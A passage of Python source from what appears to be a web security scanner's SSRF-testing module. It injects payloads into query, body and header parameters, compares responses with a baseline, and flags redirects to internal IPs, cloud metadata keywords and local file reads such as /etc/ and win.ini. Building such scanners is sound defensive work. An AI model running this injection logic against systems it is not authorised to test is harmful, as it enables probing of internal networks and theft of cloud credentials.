                    raw_part  = f"{urllib.parse.quote(cname, safe='')}={payload}"
                    new_qs    = f"{other_qs}&{raw_part}" if other_qs else raw_part
                    test_url  = (
                        f"{parsed.scheme}://{parsed.netloc}"
                        f"{parsed.path}?{new_qs}"
                    )
                else:
                    qparams = urllib.parse.parse_qs(parsed.query)
                    qparams[cname] = [payload]
                    new_qs  = urllib.parse.urlencode(qparams, doseq=True)
                    test_url = (
                        f"{parsed.scheme}://{parsed.netloc}"
                        f"{parsed.path}?{new_qs}"
                    )
                resp = self.send_request_with_traffic(
                    test_url, clean_headers, method=method,
                    payload=payload, payload_type=pt,
                )

            elif ctype == "param_body":
                content_type = headers.get("Content-Type", "").lower()
                if "application/json" in content_type:
                    # JSON: payload is always a string value, no URL-encoding
                    try:
                        jdata = json.loads(body_content or "{}")
                    except Exception:
                        jdata = {}
                    jdata[cname] = payload
                    new_body = json.dumps(jdata)
                elif raw_inject:
                    # Form-encoded raw mode: encode other params normally,
                    # but write our payload value verbatim (no extra encoding)
                    other_parts = []
                    for k, v in (body_params or {}).items():
                        if k == cname:
                            continue
                        val = v[0] if isinstance(v, list) else v
                        other_parts.append(
                            f"{urllib.parse.quote(k, safe='')}="
                            f"{urllib.parse.quote(str(val), safe='')}"
                        )
                    raw_part = (
                        f"{urllib.parse.quote(cname, safe='')}={payload}"
                    )
                    all_parts = other_parts + [raw_part]
                    new_body  = "&".join(all_parts)
                else:
                    bparams = {k: (v[0] if isinstance(v, list) else v)
                               for k, v in body_params.items()}
                    bparams[cname] = payload
                    new_body = urllib.parse.urlencode(bparams)

                resp = self.send_request_with_traffic(
                    full_url, clean_headers, method=method,
                    body=new_body,
                    payload=payload, payload_type=pt,
                )

            elif ctype == "header":
                # Headers are never URL-encoded regardless of raw_inject.
                # NOTE: "Host" is special — requests strips and re-adds it from the
                # URL.  To actually override Host we must pass it explicitly AND
                # ensure the underlying request library respects it (some do if
                # passed as a header kwarg).  We keep it in mod_headers; callers
                # that need true Host override should use _ssrf_inject_host() instead.
                #
                # Strip any existing header with the same name under ANY casing
                # before injecting the payload.  Without this, a request that
                # already has "referer: https://..." and we inject "Referer: <payload>"
                # ends up sending both — the server sees the old value too.
                #
                # Skip non-ASCII payloads — HTTP/1.1 headers must be latin-1 safe.
                # Unicode lookalike hostnames (e.g. ⓛⓞⓒⓐⓛⓗⓞⓢⓣ) in a header
                # value cause encode errors, producing misleading 0-length responses.
                try:
                    payload.encode("latin-1")
                except (UnicodeEncodeError, UnicodeDecodeError):
                    logger.debug(f"Skipping non-ASCII header payload: {payload[:40]!r}")
                    return None
                cname_lower = cname.lower()
                mod_headers = {
                    k: v for k, v in clean_headers.items()
                    if k.lower() != cname_lower
                }
                mod_headers[cname] = payload
                resp = self.send_request_with_traffic(
                    full_url, mod_headers, method=method,
                    body=body_content,
                    payload=payload, payload_type=pt,
                )

            else:
                return None

            elapsed = round(time.time() - start, 3)

            if resp and hasattr(resp, "status_code"):
                return {
                    "status":  getattr(resp, "status_code", 0),
                    "length":  len(getattr(resp, "content", b"")),
                    "time":    elapsed,
                    "text":    getattr(resp, "text", "")[:8000],
                    "headers": dict(getattr(resp, "headers", {})),
                }

        except Exception as e:
            logger.debug(f"SSRF inject error ({payload[:40]}): {e}")

        return None

    def _ssrf_evaluate(
        self,
        injected:        Dict,
        payload:         str,
        candidate:       Dict,
        baseline:        Dict,
        results:         Dict,
        phase:           str,
        phase_key:       str,
        confidence_base: str,
    ) -> None:
        """Analyse an injection response and record findings if suspicious."""
        confidence, note = self._ssrf_analyse_response(
            injected["status"], injected["length"], injected["time"],
            injected["text"], payload, baseline,
            resp_headers=injected.get("headers", {}),
            original_value=str(candidate.get("value", "")),
        )

        # Upgrade/downgrade based on the phase base confidence
        final_conf = self._ssrf_merge_confidence(confidence, confidence_base)

        if final_conf in ("HIGH", "MEDIUM", "LOW"):
            self._ssrf_record_finding(
                results, candidate, payload,
                injected["status"], injected["length"], injected["time"],
                baseline, phase=phase,
                confidence=final_conf, note=note,
                response_text=injected.get("text", ""),
            )
            results["detection_summary"][phase_key] = True

    # Internal IP ranges — used to detect redirect-to-internal SSRF
    _INTERNAL_IP_RE = re.compile(
        r'(?:'
        r'https?://(?:'
            r'127\.\d+\.\d+\.\d+'           # 127.x.x.x
            r'|10\.\d+\.\d+\.\d+'           # 10.x.x.x
            r'|192\.168\.\d+\.\d+'          # 192.168.x.x
            r'|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+'  # 172.16-31.x.x
            r'|169\.254\.\d+\.\d+'          # 169.254.x.x (link-local / IMDS)
            r'|0\.0\.0\.0'                  # 0.0.0.0
            r'|localhost'
        r')'
        r'|gopher://'                       # any gopher → internal protocol
        r'|file://'                         # any file → local read
        r'|dict://'
        r')',
        re.IGNORECASE,
    )

    def _ssrf_analyse_response(
        self,
        status:   int,
        length:   int,
        elapsed:  float,
        text:     str,
        payload:  str,
        baseline: Dict,
        resp_headers: Dict = None,
        original_value: str = "",
    ) -> Tuple[str, str]:
        """
        Compare the injected response against the baseline and return
        (confidence, human-readable note) indicating the level of evidence.

        Returns ("NONE", "") if response looks identical to baseline.
        """
        b_status  = baseline["status"]
        b_length  = baseline["length"]
        b_time    = baseline["time"]
        text_low  = (text or "").lower()
        resp_headers = resp_headers or {}
        notes: List[str] = []

        # ── Guard: status=0 means the scanner's OWN request failed ───────
        is_scanner_error = (status == 0)

        # ── Reflection guard ──────────────────────────────────────────────
        # If the app simply reflects the parameter value back in the page
        # (e.g. "No results for: http://127.0.0.1/admin"), the response
        # length increases by approximately (len(payload) - len(original_value))
        # bytes, and keywords inside the payload URL (like "iam" in
        # http://...iam...) appear in the response.
        #
        # We detect this by checking:
        #   1. The length delta closely matches the payload-vs-original size diff
        #   2. The payload string itself appears in the response body
        #
        # If both are true → this is reflection, NOT SSRF → suppress keyword/
        # content-based signals (still allow status change and large size diffs).
        length_delta = length - b_length
        payload_len  = len(payload)
        orig_len     = len(original_value) if original_value else 0
        expected_reflection_delta = payload_len - orig_len

        # A reflection is "exact" if the delta is within ±10 bytes of what
        # we'd expect from substituting the payload for the original value.
        # We also require the payload string to actually appear in the response.
        _is_reflection = (
            not is_scanner_error
            and payload in (text or "")
            and abs(length_delta - expected_reflection_delta) <= 10
        )

        # ── 0. 3xx redirect to internal address = open-redirect SSRF ─────
        # We send requests with allow_redirects=False for param injection.
        # A 3xx response with a Location header pointing at an internal IP,
        # loopback, or non-HTTP scheme is HIGH confidence SSRF — the server
        # is redirecting our fetcher to an internal resource.
        if status in (301, 302, 303, 307, 308) and not is_scanner_error:
            location = resp_headers.get("Location", "") or resp_headers.get("location", "")
            if location and self._INTERNAL_IP_RE.search(location):
                return (
                    "HIGH",
                    f"Server issued {status} redirect to internal address: "
                    f"{location[:80]}"
                )

        if not is_scanner_error:
            # ── 1. Sensitive data in response (highest confidence) ────────
            # Skip if the response is just reflecting the payload back.
            # Real SSRF returns actual data from the target; reflection only
            # returns our own payload string which can contain any keywords.
            if not _is_reflection:
                for pattern in _SENSITIVE_PATTERNS:
                    if pattern.search(text):
                        return (
                            "HIGH",
                            f"Sensitive data detected in response — pattern: "
                            f"'{pattern.pattern[:40]}'"
                        )

                # ── 1b. Service fingerprints (direct service access) ──────────
                for svc_name, svc_pattern in _SERVICE_FINGERPRINTS.items():
                    if svc_pattern.search(text):
                        return (
                            "HIGH",
                            f"Internal service fingerprint detected — service: {svc_name}"
                        )

                # ── 2. Cloud metadata keywords ────────────────────────────────
                # Also suppress on reflection: keywords like "iam", "meta-data"
                # in the payload URL are reflected into the page, not fetched.
                meta_hits = [kw for kw in _METADATA_KEYWORDS if kw.lower() in text_low]
                if meta_hits:
                    return (
                        "HIGH",
                        f"Cloud metadata keyword(s) in response: "
                        f"{', '.join(meta_hits[:5])}"
                    )

            # ── 3. Connection error strings (server tried to connect) ─────
            # Connection errors are meaningful regardless of reflection — the
            # server attempting a connection (and failing) is SSRF evidence.
            err_hits = [e for e in _CONNECTION_ERROR_STRINGS if e in text_low]
            if err_hits:
                notes.append(
                    f"Server connection error strings in response: "
                    f"{', '.join(err_hits[:3])}"
                )
                return "MEDIUM", "; ".join(notes)

        # ── 4. Status code change ─────────────────────────────────────────
        status_changed = (status != b_status and status not in (0, 429))
        if status_changed:
            notes.append(
                f"Status changed: {b_status} → {status}"
            )

        # ── 5. Response length change ─────────────────────────────────────
        # Require >150 bytes OR >12% ratio to avoid flagging on reflection:
        # reflection adds exactly (len(payload) - len(original)) bytes.
        # Most SSRF payloads are 20-80 bytes; we want to ignore that delta.
        # If this IS reflection (_is_reflection=True), skip the length signal
        # entirely — it tells us nothing except the app echoes input.
        length_diff  = abs(length - b_length)
        length_ratio = length_diff / max(b_length, 1)
        length_changed = (
            not _is_reflection
            and (length_diff > 150 or (length_ratio > 0.12 and length_diff > 50))
        )
        if length_changed:
            notes.append(
                f"Length changed: {b_length} → {length} "
                f"(Δ{length_diff} bytes / {length_ratio:.0%})"
            )
        elif _is_reflection and length_diff > 0:
            # Informational: don't report as finding, but log at DEBUG
            logger.debug(
                f"SSRF: payload reflected in response (Δ{length_diff}b ≈ "
                f"expected Δ{expected_reflection_delta}b) — suppressing length signal"
            )

        # ── 6. Response time anomaly ──────────────────────────────────────
        time_threshold = getattr(self, "scan_time_threshold", 1.5)
        time_diff      = elapsed - b_time
        if time_diff > time_threshold:
            notes.append(
                f"Response time increased: {b_time}s → {elapsed}s "
                f"(+{time_diff:.2f}s) — possible open port / network delay"
            )
        # Very fast response on a non-loopback target often = port closed
        elif elapsed < 0.2 and b_time > 0.5 and status == 0:
            notes.append(
                "Unusually fast failure — port likely closed "
                "(connection refused immediately)"
            )

        # ── 7. Response body contains response snippet indicating success ──
        # Look for HTTP/1.x from gopher-proxied requests.
        # Only check if status=200 — status=0 means the scanner itself failed
        # and the "text" is the scanner's own exception message, not server data.
        if not is_scanner_error and text and "HTTP/1." in text:
            notes.append(
                "Response body contains raw HTTP protocol data "
                "— possible gopher proxy response returned"
            )

        if not notes:
            return "NONE", ""

        # Assign confidence based on number and type of signals
        if len(notes) >= 2:
            return "MEDIUM", "; ".join(notes)
        if status_changed or length_changed:
            return "LOW", "; ".join(notes)
        return "LOW", "; ".join(notes)

    def _ssrf_record_finding(
        self,
        results:    Dict,
        candidate:  Dict,
        payload:    str,
        status:     int,
        length:     int,
        elapsed:    float,
        baseline:   Dict,
        phase:      str,
        confidence: str,
        note:       str,
        force:      bool = False,
        response_text: str = "",
    ) -> None:
        """Append a finding to results and emit a progress message."""
        if confidence == "NONE" and not force:
            return

        results["vulnerable"] = True
        results["stats"]["vulnerabilities"] += 1

        # Extract a useful snippet of the response for display
        snippet = ""
        if response_text:
            # Try to find the most interesting part
            text_clean = response_text.strip()
            # For file reads — show first lines
            if any(p in payload for p in ("file://", "/etc/", "/proc/", "win.ini")):
                snippet = text_clean[:300]
            # For cloud metadata — show whole body (usually small)
            elif any(kw in response_text.lower() for kw in ("ami-id", "instance-id", "accesskeyid", "computemetadata")):
                snippet = text_clean[:500]
            # For service fingerprints — show first 200 chars
            elif note and "fingerprint" in note.lower():
                snippet = text_clean[:200]
            else:
                snippet = text_clean[:150]

        detail = {
            "phase":            phase,
            "parameter":        candidate["name"],
            "param_type":       candidate["type"],
            "display":          candidate["display"],
            "payload":          payload,
            "status_code":      status,
            "length":           length,
            "response_time":    elapsed,
            "baseline_status":  baseline["status"],
            "baseline_length":  baseline["length"],
            "confidence":       confidence,
            "note":             note,
            "response_snippet": snippet,
        }
        results["details"].append(detail)

        icon = {"HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🟢", "INFO": "⚪"}.get(
            confidence, "⚪"
        )
        msg = (
            f"  {icon} [{confidence}] SSRF indicator — "
            f"phase:{phase}  param:{candidate['name']}\n"
            f"     payload : {payload[:80]}{'...' if len(payload) > 80 else ''}\n"
            f"     status  : {baseline['status']} → {status}  "
            f"length: {baseline['length']} → {length}\n"
            f"     note    : {note}"
        )
        if snippet:
            snippet_display = snippet[:120].replace("\n", "↵")
            msg += f"\n     data    : {snippet_display}"
        self.scan_progress.emit(msg)

    # =========================================================================
    # PARSING / IDENTIFICATION HELPERS
    # =========================================================================

    def _ssrf_parse_request(
        self,
    ) -> Tuple[str, str, Dict, Dict, str, Dict]:
        """
        Parse the raw request stored in self.request_data.
        Returns (full_url, method, headers, body_params, body_content, cookies).
        """
        full_url     = self.request_data.get("url", "")
        request_text = self.request_data.get("request_text", "")
        lines        = request_text.split("\n")

        method = "GET"
        if lines:
            fl = lines[0].strip()
            if fl.startswith("POST"):
                method = "POST"
            elif fl.startswith("PUT"):
                method = "PUT"
            elif fl.startswith("PATCH"):
                method = "PATCH"

        headers: Dict[str, str]  = {}
        cookies: Dict[str, str]  = {}
        seen_keys_lower: Dict    = {}
        body_content             = ""

        body_start = False
        for idx, line in enumerate(lines[1:], 1):
            if line.strip() in ("", "\r\n", "\r"):
                body_content = "\n".join(lines[idx + 1:]).strip()
                body_start   = True
                break
            if ":" in line:
                key, value = line.split(":", 1)
                key, value = key.strip(), value.strip()
                kl = key.lower()
                if kl in seen_keys_lower:
                    continue
                seen_keys_lower[kl] = key
                headers[key] = value
                if kl == "cookie":
                    raw_pairs = re.split(r';\s*', value)
                    expanded = []
                    for piece in raw_pairs:
                        sub = re.split(r',\s+(?=\w[^=]*=)', piece)
                        expanded.extend(s.strip() for s in sub if s.strip())
                    for pair in expanded:
                        if "=" in pair:
                            cn, cv = pair.split("=", 1)
                            cookies[cn.strip()] = cv.strip()

        body_params: Dict[str, Any] = {}
        if body_content:
            content_type = headers.get("Content-Type", "").lower()
            if "application/json" in content_type:
                try:
                    jdata = json.loads(body_content)
                    if isinstance(jdata, dict):
                        body_params = {k: [str(v)] for k, v in jdata.items()}
                except Exception:
                    pass
            else:
                try:
                    body_params = urllib.parse.parse_qs(body_content)
                except Exception:
                    pass

        return full_url, method, headers, body_params, body_content, cookies

    def _ssrf_identify_candidates(
        self,
        parsed,
        params:      Dict,
        headers:     Dict,
        body_params: Dict,
        body_content: str,
    ) -> List[Dict]:
        """
        Return a prioritised list of SSRF candidate locations.
        Each dict: {name, type, value, tier, display}
        """
        candidates: List[Dict] = []
        seen: set = set()

        def _add(name, ctype, value, tier):
            # For headers use lowercase key so 'origin' and 'Origin' are the
            # same candidate — prevents duplicate testing of the same header.
            key = f"{ctype}:{name.lower() if ctype == 'header' else name}"
            if key in seen:
                return
            seen.add(key)
            icon = "🔗" if ctype == "param_url" else (
                "📮" if ctype == "param_body" else "📋"
            )
            candidates.append({
                "name":    name,
                "type":    ctype,
                "value":   value,
                "tier":    tier,
                "display": f"{icon} {ctype.replace('_', ' ').title()}: {name}",
            })

        # ── URL query parameters ──────────────────────────────────────────
        for pname, pvals in params.items():
            val = pvals[0] if pvals else ""
            
            is_forced = self._is_forced_point("url", pname)
            tier = self._ssrf_param_tier(pname, val)
            
            if self.forced_injection_points is not None:
                if is_forced:
                    _add(pname, "param_url", val, tier or "medium")
            elif tier:
                _add(pname, "param_url", val, tier)

        # ── POST body parameters ──────────────────────────────────────────
        for pname, pvals in body_params.items():
            val = pvals[0] if isinstance(pvals, list) and pvals else str(pvals)
            
            is_forced = self._is_forced_point("body", pname)
            tier = self._ssrf_param_tier(pname, val)
            
            if self.forced_injection_points is not None:
                if is_forced:
                    _add(pname, "param_body", val, tier or "medium")
            elif tier:
                _add(pname, "param_body", val, tier)

        # ── Headers ───────────────────────────────────────────────────────
        # In forced/manual mode: test every header that was explicitly selected.
        #   This includes SSRF-specific headers that were NOT in the original
        #   request — they are shown in the dialog as synthetic injection points
        #   (id = "header:<Name>") and the user may have checked them.
        # In auto mode: always inject the known-dangerous SSRF header set.
        # Referer is handled by its own Phase 7, Host by Phase 16 — skip here.
        if self.forced_injection_points is not None:
            # Check both headers already in the request AND the full SSRF
            # header set (which may have been shown as synthetic dialog entries)
            ALL_SSRF_CANDIDATE_HEADERS = [
                "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL",
                "X-Custom-IP-Authorization", "True-Client-IP", "CF-Connecting-IP",
                "Forwarded", "X-Forwarded-For", "Referer",
            ]
            # Build a lowercase→actual lookup so we find the value regardless
            # of how the header was capitalised in the original request.
            hdr_lower_lookup = {k.lower(): (k, v) for k, v in headers.items()}
            tested_lower: set = set()
            for hname in ALL_SSRF_CANDIDATE_HEADERS:
                hl = hname.lower()
                if self._is_forced_point("header", hname) and hl not in tested_lower:
                    tested_lower.add(hl)
                    actual_key, actual_val = hdr_lower_lookup.get(hl, (hname, ""))
                    _add(actual_key, "header", actual_val, "medium")
            # Also honour any other headers the user may have explicitly selected
            for hname in headers.keys():
                hl = hname.lower()
                if self._is_forced_point("header", hname) and hl not in tested_lower:
                    tested_lower.add(hl)
                    _add(hname, "header", headers.get(hname, ""), "medium")
        else:
            AUTO_INJECT_HEADERS = [
                "X-Forwarded-Host",
                "X-Original-URL",
                "X-Rewrite-URL",
                "X-Custom-IP-Authorization",
                "True-Client-IP",
                "CF-Connecting-IP",
                "Forwarded",
                "X-Forwarded-For",
            ]
            for hname in AUTO_INJECT_HEADERS:
                _add(hname, "header", headers.get(hname, ""), "medium")

        # Sort: high tier first
        candidates.sort(key=lambda c: 0 if c["tier"] == "high" else 1)
        return candidates

    def _ssrf_param_tier(self, name: str, value: str) -> Optional[str]:
        """
        Return "high", "medium", or None based on how likely this param
        controls a server-side HTTP fetch.
        """
        name_low = name.lower().replace("-", "").replace("_", "")

        # Exact high-tier name match
        if name_low in _SSRF_PARAM_NAMES_HIGH:
            return "high"

        # Substring match
        for sub in _SSRF_PARAM_SUBSTRINGS:
            if sub in name_low:
                return "medium"

        # Value already looks like a URL → always test regardless of name
        if self._ssrf_value_is_url(value):
            return "high"

        # Value looks like a bare hostname or IP
        if re.match(r"^[\w.-]+\.\w{2,}$", value) or re.match(r"^\d+\.\d+\.\d+\.\d+$", value):
            return "medium"

        return None

    def _ssrf_baseline(
        self,
        full_url:     str,
        method:       str,
        headers:      Dict,
        body_params:  Dict,
        body_content: str,
        cookies:      Dict,
    ) -> Optional[Dict]:
        """
        Send the original request (no modifications) and record the baseline.
        """
        # Strip only Host — keep Cookie so baseline reflects authenticated state
        clean = {k: v for k, v in headers.items() if k.lower() != "host"}
        try:
            start = time.time()
            resp  = self.send_request_with_traffic(
                full_url, clean, method=method,
                body=body_content,
                payload="[BASELINE]", payload_type="SSRF-Baseline",
            )
            elapsed = round(time.time() - start, 3)
            if resp and hasattr(resp, "status_code"):
                return {
                    "status": getattr(resp, "status_code", 0),
                    "length": len(getattr(resp, "content", b"")),
                    "time":   elapsed,
                    "text":   getattr(resp, "text", "")[:4000],
                }
        except Exception as e:
            logger.warning(f"SSRF baseline error: {e}")
        return None

    # ── Static utility helpers ────────────────────────────────────────────────

    @staticmethod
    def _ssrf_value_is_url(value: str) -> bool:
        """Return True if the value looks like a full URL."""
        v = urllib.parse.unquote(str(value)).strip()
        return bool(re.match(
            r"^(https?|ftp|file|gopher|dict)://",
            v, re.IGNORECASE
        ))

    @staticmethod
    def _ssrf_classify_ip(host: str) -> Optional[str]:
        """
        Return the private IP class ("A", "B", "C", "LO", "LL") or None
        if the host is not a recognised private/loopback address.
        """
        for pattern, cls in _PRIVATE_RANGES:
            if pattern.match(host):
                return cls
        return None

    @staticmethod
    def _ssrf_extract_host_from_value(value: str) -> Optional[str]:
        """
        Extract the hostname/domain from a URL-like parameter value.
        Handles values that are single or double URL-encoded, as is common
        in SSRF-vulnerable POST parameters.

        e.g.  http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2F...
              → unquote → http://stock.weliketoshop.net:8080/product/...
              → netloc  → stock.weliketoshop.net:8080

        Returns the netloc (host:port) or None.
        """
        try:
            s = str(value or "")
            # Decode up to 2 layers of URL-encoding
            for _ in range(2):
                decoded = urllib.parse.unquote(s)
                if decoded == s:
                    break
                s = decoded
            parsed = urllib.parse.urlparse(s)
            return parsed.netloc or parsed.hostname or None
        except Exception:
            return None

    @staticmethod
    def _ssrf_merge_confidence(detected: str, base: str) -> str:
        """
        Return the higher of two confidence strings.
        Order: NONE < INFO < LOW < MEDIUM < HIGH
        """
        order = {"NONE": 0, "INFO": 1, "LOW": 2, "MEDIUM": 3, "HIGH": 4}
        d = order.get(detected, 0)
        b = order.get(base, 0)
        # If detection engine found nothing meaningful, don't record
        if detected == "NONE":
            return "NONE"
        # Take the lower of detected vs base to avoid over-reporting
        # (e.g. a phase-base of HIGH doesn't override a detected LOW)
        level = min(d, b)
        reverse = {v: k for k, v in order.items()}
        return reverse.get(level, "NONE")